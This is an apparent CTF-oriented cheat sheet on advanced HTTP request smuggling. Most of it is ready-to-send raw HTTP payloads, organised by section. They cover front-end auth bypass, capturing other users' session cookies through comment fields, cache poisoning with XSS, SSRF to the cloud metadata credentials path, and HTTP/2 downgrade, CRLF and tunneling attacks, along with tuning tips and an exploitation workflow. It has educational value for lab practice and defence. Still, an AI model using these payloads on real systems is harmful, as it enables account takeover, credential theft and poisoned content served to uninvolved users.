# HTTP Request Smuggling — Advanced Attacks

---

## Quick Reference

| Attack | Goal | Requires |
|--------|------|----------|
| Bypass front-end auth | Access restricted endpoints | CL.TE or TE.CL confirmed |
| Capture requests | Steal other users' cookies/tokens | Storage endpoint (comments, profile, search) |
| Cache poisoning | Serve malicious response to all users | Caching layer between front-end and back-end |
| Reflected XSS via smuggling | Execute JS in victim's browser | XSS reflected in back-end response |
| SSRF via smuggling | Hit internal services | Back-end makes sub-requests by Host header |
| Web cache deception | Cache authenticated content | Cache based on URL, not session |
| HTTP/2 downgrade | Smuggle via HTTP/2 front-end | HTTP/2 front-end → HTTP/1.1 back-end |
| Request tunneling | Bypass all front-end controls | HTTP/2 with header injection |

```http
-- Universal smuggle-to-capture skeleton (CL.TE)
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

POST /store-comment HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=
```

---

## What are Advanced Smuggling Attacks? 🔓

Once you confirm a smuggling vulnerability, the raw desync becomes a weapon. Advanced attacks chain the desync with other application behaviors — storage endpoints, caches, redirects, internal routing — to achieve high-impact outcomes far beyond a simple 400 error on the next user's request.

**Impact:**
- 🔴 Full authentication bypass — access admin panels, internal APIs, restricted paths
- 🔴 Session hijacking — capture live session tokens from other users' requests
- 🔴 Persistent cache poisoning — one smuggle poisons responses served to all future visitors
- 🔴 SSRF — reach internal services the front-end is supposed to block
- ⚠️ These attacks affect real users on shared infrastructure — lab environments only

---

## Bypassing Front-End Security Controls

The front-end enforces security (auth headers, IP checks, path restrictions). The back-end trusts the front-end blindly. Smuggle a request that skips the front-end entirely.

**Bypass a restricted path (`/admin` only for 127.0.0.1):**

```http
-- CL.TE: smuggle a direct GET /admin to the back-end
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 127.0.0.1
Content-Length: 10

x=1
```

The back-end sees `GET /admin` with `Host: 127.0.0.1` — passes the internal IP check that the front-end normally enforces.

**Bypass a required auth header:**

```http
-- Front-end adds "X-Auth-Token: <validated>" before forwarding
-- Smuggle a request without going through front-end validation:
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 67
Transfer-Encoding: chunked

0

GET /internal-api HTTP/1.1
Host: vulnerable.com
X-Auth-Token: arbitrary-value
```

**Bypass IP allowlist on back-end:**

```http
0

GET /admin/delete?user=carlos HTTP/1.1
Host: vulnerable.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Content-Length: 10

x=1
```

---

## Capturing Other Users' Requests

If the application has any endpoint that **stores user-supplied data** (comments, profiles, search history, contact forms), you can use it as a capture buffer. The smuggled prefix dumps the next victim's full HTTP request — including their `Cookie` and `Authorization` headers — into that storage field.

**How it works:**

```
1. You smuggle a prefix: POST /store-comment ... comment=
2. Next user's request arrives at back-end
3. Back-end appends that request to your smuggled prefix
4. The victim's full request (headers + cookies) becomes the value of "comment="
5. You read the comment → you have their session token
```

**CL.TE capture payload:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

postId=1&name=attacker&comment=
```

⚠️ The `Content-Length: 200` in the smuggled request must be **larger than the prefix** — it tells the back-end how many more bytes to read, which forces it to consume the victim's request as the body.

**After the capture — retrieve from storage:**

```http
GET /post/1 HTTP/1.1
Host: vulnerable.com
```

Look for the `comment` field — it will contain the victim's raw HTTP headers including `Cookie: session=<token>`.

**Tuning the Content-Length:**
- Too small → captures only part of the victim's headers (may miss Cookie)
- Too large → back-end waits forever, victim gets a timeout
- Start with 200–400 and adjust based on what you see captured

---

## Cache Poisoning via Smuggling

If a caching layer sits between the front-end and back-end, you can smuggle a request that makes the cache store a malicious response — which is then served to every future visitor of that URL.

**How it works:**

```
1. Smuggle a prefix: GET /static/app.js
2. Next request that hits the back-end: GET /post?id=1 (a victim's request)
3. Back-end processes: GET /static/app.js\r\n\r\nGET /post?id=1
4. Back-end returns the response for /post?id=1
5. Cache stores that response under the key /static/app.js
6. All future visitors requesting /static/app.js get the poisoned response
```

**CL.TE cache poisoning payload:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: vulnerable.com
```

Then immediately send a normal request to trigger the cache write:

```http
GET /post?id=<xss-payload> HTTP/1.1
Host: vulnerable.com
```

**Cache poisoning + XSS combined:**

```http
0

GET /resources/js/app.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: "><script>alert(document.cookie)</script>
```

If the back-end reflects `X-Forwarded-Host` into the page (e.g. for canonical URLs or CDN links), the XSS payload gets cached under the JS file URL.

---

## Reflected XSS via Smuggling

Some XSS payloads are blocked by the front-end WAF but not the back-end. Smuggling bypasses the WAF entirely — the back-end processes the smuggled request directly.

**Standard reflected XSS — blocked by WAF on front-end:**

```http
GET /?search=<script>alert(1)</script> HTTP/1.1
```

**Same XSS smuggled past the WAF:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET /?search=<script>alert(document.cookie)</script> HTTP/1.1
Host: vulnerable.com
```

The next user's browser request gets `GET /?search=<script>...</script>` prepended — back-end reflects it, XSS fires in their browser.

⚠️ This is a **stored/reflected hybrid** — the XSS doesn't fire for you, it fires for the next victim whose request gets poisoned.

---

## SSRF via Smuggling

Smuggle a request with a `Host` header pointing to an internal service. The back-end makes a sub-request to your specified host — bypassing the front-end's SSRF protections.

**Basic SSRF to internal metadata service:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```

**SSRF to internal admin panel:**

```http
0

GET /admin HTTP/1.1
Host: internal-admin.local
X-Forwarded-For: 127.0.0.1
```

**SSRF via absolute-form request URI:**

```http
0

GET http://192.168.0.1:8080/admin/config HTTP/1.1
Host: 192.168.0.1
```

---

## HTTP/2 Request Smuggling

HTTP/2 uses binary framing — there's no ambiguity between CL and TE. But when a front-end speaks HTTP/2 to clients and **downgrades to HTTP/1.1** when talking to the back-end, the translation layer reintroduces the smuggling surface.

**H2.CL — HTTP/2 front-end, CL-based back-end:**

The front-end receives an HTTP/2 request, translates it to HTTP/1.1, and forwards it. If you inject a `content-length` pseudo-header that doesn't match the actual body, the back-end cuts the body at the wrong position.

```
:method POST
:path /
:authority vulnerable.com
content-type application/x-www-form-urlencoded
content-length 0                        ← injected, tells back-end body is 0 bytes

GET /admin HTTP/1.1\r\n                 ← actual body, treated as start of next request
Host: vulnerable.com\r\n
\r\n
```

**In Burp (HTTP/2 smuggling):**
- Switch to HTTP/2 in Repeater
- Add `content-length: 0` as a manual header (Burp lets you inject arbitrary HTTP/2 headers)
- Put the smuggled prefix in the request body

**H2.TE — inject Transfer-Encoding into HTTP/2 headers:**

HTTP/2 forbids `Transfer-Encoding` — but some front-ends pass it through to the HTTP/1.1 back-end anyway.

```
:method POST
:path /
transfer-encoding chunked              ← forbidden in HTTP/2 but some front-ends forward it

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

**CRLF injection in HTTP/2 header values:**

HTTP/2 header values can contain `\r\n` — if the front-end naively passes these into HTTP/1.1 headers, you can inject an entirely new header or split the request.

```
:method GET
:path /
foo bar\r\nTransfer-Encoding: chunked  ← CRLF inside a header value
```

This becomes two HTTP/1.1 headers after downgrade:
```http
foo: bar
Transfer-Encoding: chunked
```

---

## Request Tunneling (HTTP/2)

Request tunneling is a more powerful variant where you smuggle an **entire hidden request inside the header section** of an HTTP/2 request — bypassing front-end rewriting entirely because the front-end never sees the tunneled content as a request.

**How it differs from classic smuggling:**

```
Classic smuggling:  poison the shared connection buffer → affects next user
Request tunneling:  embed a hidden back-end request in your own → affects only you
                    but bypasses ALL front-end header injection/rewriting
```

**Tunneling via HTTP/2 header injection:**

```
:method POST
:path /
:authority vulnerable.com
content-type application/x-www-form-urlencoded
content-length 85
foo ignored\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\nX-Ignore: x

body=x
```

After HTTP/2 → HTTP/1.1 downgrade, the back-end sees:
```http
POST / HTTP/1.1
Host: vulnerable.com
foo: ignored

GET /admin HTTP/1.1
Host: vulnerable.com
X-Ignore: x

body=x
```

The tunneled `GET /admin` is processed by the back-end — the front-end never rewrote or validated it.

---

## Exploitation Workflow

1. **Confirm the vulnerability type** — CL.TE, TE.CL, or TE.TE (from basics.md timing probes)
2. **Map the application** — find endpoints that store user input (comments, logs, profiles, search)
3. **Identify your attack goal** — auth bypass? credential capture? cache poison? SSRF?
4. **For auth bypass** — craft smuggled prefix with target path + spoofed internal headers
5. **For credential capture** — smuggle POST to storage endpoint with large `Content-Length`; retrieve after next user visits
6. **For cache poisoning** — smuggle a GET to a cacheable static path; follow immediately with a request that returns a poisoned response
7. **For SSRF** — smuggle with absolute URI or internal `Host` header pointing to target service
8. **For HTTP/2 attacks** — switch Burp to HTTP/2, inject `content-length` or CRLF into headers, put smuggled request in body
9. **Tune Content-Length** — too small = partial capture; too large = timeout; iterate in 50-byte steps
10. **Verify impact** — check storage endpoint, cache response, or back-end logs to confirm

---

## Common Vulnerable Patterns

**Back-end trusts front-end headers blindly:**

```python
# ❌ Vulnerable — back-end grants admin based on header set by front-end
# Attacker smuggles a request and sets this header directly
if request.headers.get('X-Internal-Admin') == 'true':
    return admin_panel()
```

**Caching layer keyed only on URL path:**

```nginx
# ❌ Vulnerable — cache key ignores Vary headers and session
proxy_cache_key "$scheme$request_method$host$uri";
# Smuggled response for /static/app.js gets cached for ALL users
```

**HTTP/2 front-end forwarding forbidden headers:**

```
# ❌ Vulnerable Nginx config — passes through transfer-encoding from HTTP/2
http2 on;
proxy_pass http://backend;
# Missing: proxy_set_header Transfer-Encoding "";
# Missing: proxy_set_header Content-Length "";
```

**Storage endpoint reflects full request body:**

```python
# ❌ Vulnerable — stores raw POST body including any smuggled prefix content
@app.route('/log', methods=['POST'])
def log():
    entry = request.get_data(as_text=True)  # includes victim's headers if smuggled
    db.save(entry)
    return 'ok'
```

---

## CTF & Practical Tips

**Fastest attack path for CTFs:**

```
1. Confirm CL.TE or TE.CL with timing probe
2. Look for /admin, /internal, /debug → smuggle GET with Host: localhost
3. Look for comment/feedback forms → smuggle capture payload
4. Check if challenge mentions caching → cache poisoning angle
```

**Speed tips:**
- ✅ Install **Burp HTTP Request Smuggler extension** — scans for all types automatically
- ✅ For credential capture: send the smuggle payload, then wait 15–30 seconds before checking the storage endpoint — victim requests take time
- ✅ Increase capture `Content-Length` by 50 bytes at a time until you see full `Cookie:` header
- ✅ For HTTP/2: use Burp's Inspector panel to add raw headers — the GUI won't let you inject `\r\n` but the Inspector will
- ✅ Test cache poisoning against static assets (`/resources/js/`, `/static/`) — these are most likely cached
- ⚠️ If the server closes the connection after your smuggle — it's normalizing headers (not vulnerable to that type)
- ⚠️ HTTP/2 smuggling requires the Burp extension or manual Inspector use — standard Repeater abstracts too much

**Common CTF scenarios:**
- **"Admin panel accessible only from localhost"** → CL.TE smuggle with `Host: 127.0.0.1`
- **"Leave a comment on the post"** → credential capture endpoint, aim for session cookie
- **"Static files are cached"** → cache poisoning, smuggle to swap static file response
- **"App uses HTTP/2"** → H2.CL or H2.TE attack, inject `content-length: 0` and smuggle in body
- **"X-Forwarded-For is reflected somewhere"** → SSRF or XSS via smuggled header injection

---

## Key Takeaways

- ✅ Advanced smuggling chains desync with app behavior — storage endpoints, caches, redirects, internal routing
- ✅ Auth bypass works because the back-end trusts headers that the front-end normally injects — smuggling skips that injection
- ✅ Credential capture requires a storage endpoint and a large `Content-Length` to consume the victim's full request as body
- ✅ Cache poisoning requires a caching layer keyed on URL — one smuggle can poison responses for all future users
- ✅ HTTP/2 smuggling targets the HTTP/2 → HTTP/1.1 downgrade translation layer — `content-length` injection and CRLF in headers are the primary vectors
- ✅ Request tunneling bypasses all front-end header rewriting — more surgical than classic smuggling, no collateral damage to other users